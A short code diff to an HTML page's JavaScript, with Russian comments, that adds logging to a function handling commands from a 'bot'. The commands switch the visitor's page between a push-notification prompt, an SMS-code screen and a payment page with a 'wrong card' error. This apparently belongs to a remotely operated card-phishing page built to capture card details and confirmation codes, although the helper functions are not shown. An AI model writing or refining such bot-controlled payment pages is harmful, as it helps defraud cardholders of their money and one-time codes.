@@ -498,17 +498,20 @@
             }
         }
 
-        function handleBotCommand(command) {
-            console.log('🤖 Обработка команды:', command);
+       function handleBotCommand(command) {
+    console.log('🤖 Обработка команды:', command);
 
-            if (command.action === 'push') {
-                window.showPushNotification();
-            } else if (command.action === 'sms') {
-                window.redirectToSMS();
-            } else if (command.action === 'wrong_card') {
-                window.redirectToPaymentWithError();
-            }
-        }
+    if (command.action === 'push') {
+        console.log('🔔 Получена команда PUSH');
+        window.showPushNotification();
+    } else if (command.action === 'sms') {
+        console.log('📱 Получена команда SMS');
+        window.redirectToSMS();
+    } else if (command.action === 'wrong_card') {
+        console.log('❌ Получена команда WRONG_CARD');
+        window.redirectToPaymentWithError();
+    }
+}
 
         // Тест соединения
         function testConnection() {
@@ -627,5 +630,6 @@
     </script>
 </body>
 </html>
+
 
 
